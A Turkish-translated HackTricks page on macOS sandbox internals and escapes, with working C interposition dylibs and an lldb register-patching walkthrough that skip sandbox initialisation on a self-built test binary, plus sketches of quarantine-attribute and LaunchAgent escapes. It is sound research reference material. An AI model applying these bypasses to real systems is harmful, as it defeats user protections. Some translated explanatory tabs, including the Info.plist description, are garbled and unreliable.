# macOS Sandbox Hata Ayıklama ve Atlama

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>

## Sandbox yükleme süreci

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Resim, <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a> adresinden alınmıştır</p></figcaption></figure>

Önceki resimde, **`com.apple.security.app-sandbox`** yetkisi olan bir uygulama çalıştırıldığında **sandbox'ın nasıl yükleneceği** görülebilir.

Derleyici, `/usr/lib/libSystem.B.dylib`'i ikiliye bağlar.

Ardından, **`libSystem.B`**, **`xpc_pipe_routine`** işlevi tarafından uygulamanın yetkilerini **`securityd`**'ye gönderene kadar diğer birçok işlevi çağırır. Securityd, işlemin Sandbox içinde karantinaya alınıp alınmaması gerektiğini kontrol eder ve eğer gerekiyorsa karantinaya alır.\
Son olarak, Sandbox, **`__sandbox_ms`**'yi çağıran ve **`__mac_syscall`**'ı çağıran bir çağrı ile etkinleştirilir.

## Olası Atlamalar

### Karantina özniteliğini atlama

**Sandbox süreçleri tarafından oluşturulan dosyalara**, Sandbox'tan kaçınmak için **karantina özniteliği** eklenir. Ancak, Sandbox içindeki bir uygulama içinde **karantina özniteliği olmayan bir `.app` klasörü oluşturmayı** başarırsanız, uygulama paketi ikilisini **`/bin/bash`**'e yönlendirebilir ve **plist** içinde bazı çevre değişkenleri ekleyerek **`open`**'i kötüye kullanarak **yeni uygulamayı Sandbox dışında başlatabilirsiniz**.

Bu, [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**'de yapılan şeydir**.

{% hint style="danger" %}
Bu nedenle, şu anda, yalnızca **karantina özniteliği olmayan** bir isimle biten bir klasör oluşturabilme yeteneğine sahipseniz, macOS yalnızca **karantina** özniteliğini **`.app` klasörü** ve **ana yürütülebilir dosya** içinde **kontrol eder** (ve ana yürütülebilir dosyayı **`/bin/bash`**'e yönlendireceğiz).

Bir .app paketi zaten çalıştırılması için yetkilendirilmişse (yetkilendirilmiş çalıştırma bayrağı olan bir karantina xttr'ye sahipse), bunu da kötüye kullanabilirsiniz... ancak artık **`.app`** paketlerinin içine yazamazsınız, Sandbox yüksek bir ayrıcalığa sahip olmadıkça (ki Sandbox içinde olmayacaksınız).
{% endhint %}

### Open işlevini kötüye kullanma

[**Word sandbox atlama örneklerinin sonunda**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), Sandbox'ı atlamanın nasıl **`open`** komut satırı işlevini kötüye kullanarak yapılabileceği görülebilir.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Başlatma Ajanları/Hizmetleri

Bir uygulama **sandbox içinde çalışacak şekilde tasarlanmış olsa bile** (`com.apple.security.app-sandbox`), **Başlatma Ajanı** (`~/Library/LaunchAgents`) gibi bir yerden çalıştırılıyorsa sandbox'ı atlatabilirsiniz.\
[**Bu yazıda**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı gibi, sandbox'ı atlatabilmek için sandbox içinde çalışan bir uygulamayı Başlatma Ajanı olarak otomatik olarak çalıştırabilir ve belki de DyLib çevre değişkenleri aracılığıyla kötü amaçlı kod enjekte edebilirsiniz.

### Otomatik Başlatma Konumlarını Kötüye Kullanma

Eğer bir sandbox süreci, **daha sonra sandbox dışında çalışacak bir uygulamanın ikilisinin çalışacağı bir yere yazabiliyorsa**, ikiliyi oraya yerleştirerek **sadece oraya yerleştirerek** sandbox'tan kaçabilir. Bu tür konumların iyi bir örneği `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'tır.

Bunun için **2 adıma** ihtiyacınız olabilir: **Daha geniş bir sandbox** (`file-read*`, `file-write*`) olan bir süreç, **gerçekten sandbox dışında çalışacak bir yere yazacak** olan kodunuzu çalıştırır.

**Otomatik Başlatma konumları** hakkında bu sayfaya bakın:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Diğer süreçleri kötüye kullanma

Sandbox sürecinden, daha az kısıtlayıcı sandbox'larda (veya hiç olmayanlarda) çalışan diğer süreçleri **etkileyebiliyorsanız**, onların sandbox'larından kaçabilirsiniz:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statik Derleme ve Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı atlamanın 2 yolunu keşfetti. Sandbox, **libSystem** kütüphanesi yüklendiğinde kullanıcı alanından uygulanır. Bir ikili, bu kütüphaneyi yüklemeyi başarabilirse, sandbox'a asla giremez:

* İkili **tamamen statik olarak derlenmişse**, o kütüphaneyi yüklemeyi atlatabilir.
* **İkili hiçbir kütüphane yüklemesi gerekmese** (çünkü bağlayıcı da libSystem'de bulunur), libSystem'ü yüklemesi gerekmez.

### Kabuk Kodları

ARM64'teki **kabuk kodları bile** `libSystem.dylib`'e bağlanmalıdır:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Yetkilendirmeler

Unutmayın ki, bir uygulamanın belirli bir yetkilendirmesi varsa, bazı **eylemler**in **kum havuzunda** izin verilse bile, bu durumda:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Daha fazla bilgi için **Interposting** hakkında kontrol edin:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Sandbox'ı engellemek için `_libsecinit_initializer`'ı interpost edin
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Sandbox'ı önlemek için `__mac_syscall`'i araya girin

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Sandbox'ı lldb ile hata ayıklama ve atlatma

Sandbox ile korunması gereken bir uygulama derleyelim:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}

Bu dosya, bir macOS uygulamasının sandbox yetkilendirmelerini tanımlayan bir XML belgesidir. Sandbox, bir uygulamanın sistem kaynaklarına erişimini sınırlayan bir güvenlik mekanizmasıdır. Bu belge, uygulamanın hangi özelliklere ve kaynaklara erişebileceğini belirlemek için kullanılır.

Aşağıda, bir uygulamanın sahip olabileceği yaygın sandbox yetkilendirmelerinin bir örneği verilmiştir:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>
    <key>com.apple.security.network.client</key>
    <true/>
    <key>com.apple.security.print</key>
    <true/>
    <key>com.apple.security.temporary-exception.files.absolute-path.read-write</key>
    <array>
        <string>/Users/username/Documents/</string>
    </array>
</dict>
</plist>
```

Bu örnekte, uygulama sandbox yetkilendirmeleri için beş anahtar kullanılmıştır:

- `com.apple.security.app-sandbox`: Bu anahtar, uygulamanın sandbox modunda çalışacağını belirtir.
- `com.apple.security.files.user-selected.read-write`: Bu anahtar, kullanıcının seçtiği dosyaları okuma ve yazma yetkisi verir.
- `com.apple.security.network.client`: Bu anahtar, uygulamanın ağ istemcisi olarak çalışmasına izin verir.
- `com.apple.security.print`: Bu anahtar, uygulamanın yazıcıya erişmesine izin verir.
- `com.apple.security.temporary-exception.files.absolute-path.read-write`: Bu anahtar, belirli bir dizindeki dosyaları okuma ve yazma yetkisi verir. Bu örnekte, `/Users/username/Documents/` dizini belirtilmiştir.

Bu yetkilendirmeler, uygulamanın sandbox içinde çalışırken erişebileceği kaynakları ve özellikleri belirler. Bu sayede, uygulama istemeden sistem kaynaklarına zarar verme veya kullanıcının gizli verilerine erişme riskini azaltır.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

Info.plist dosyası, macOS sandbox uygulamalarının davranışını kontrol etmek için kullanılan bir yapılandırma dosyasıdır. Bu dosya, uygulamanın izinlerini, kaynak taleplerini ve diğer güvenlik önlemlerini belirler.

Aşağıda, Info.plist dosyasında bulunan bazı önemli anahtarlar ve açıklamaları verilmiştir:

- `com.apple.security.app-sandbox`: Bu anahtar, uygulamanın sandbox modunda çalışmasını sağlar. Sandbox modu, uygulamanın sınırlı bir çevrede çalışmasını ve diğer uygulamalar veya sistem kaynaklarına erişimini kısıtlar.

- `com.apple.security.network.client`: Bu anahtar, uygulamanın ağ istemcisi olarak çalışmasına izin verir. Bu izin olmadan uygulama ağa erişemez.

- `com.apple.security.files.user-selected.read-write`: Bu anahtar, kullanıcının seçtiği dosyaları okuma ve yazma yetkisi verir. Bu izin olmadan uygulama kullanıcının dosyalarına erişemez.

- `com.apple.security.files.downloads.read-write`: Bu anahtar, kullanıcının indirilen dosyaları okuma ve yazma yetkisi verir. Bu izin olmadan uygulama indirilen dosyalara erişemez.

- `com.apple.security.print`: Bu anahtar, uygulamanın yazıcıya erişmesine izin verir. Bu izin olmadan uygulama yazıcıya erişemez.

Bu anahtarlar, uygulamanın sandbox modunda çalışırken hangi kaynaklara erişebileceğini ve hangi izinlere sahip olacağını belirler. Info.plist dosyası, uygulamanın güvenlik ve gizlilik açıklarını en aza indirmek için dikkatlice yapılandırılmalıdır.

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Ardından uygulamayı derleyin:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Uygulama, **Sandbox izin vermediği için** **`~/Desktop/del.txt`** dosyasını **okumaya çalışacak**.\
Sandbox atlatıldığında, okuyabileceği bir dosya oluşturun:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Uygulamayı hata ayıklamak için Sandbox'ın ne zaman yüklendiğini görmek için:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Sandbox atlandığında bile TCC**, kullanıcıya masaüstünden dosya okuma izni verip vermek istemediğini soracak.
{% endhint %}

## Referanslar

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
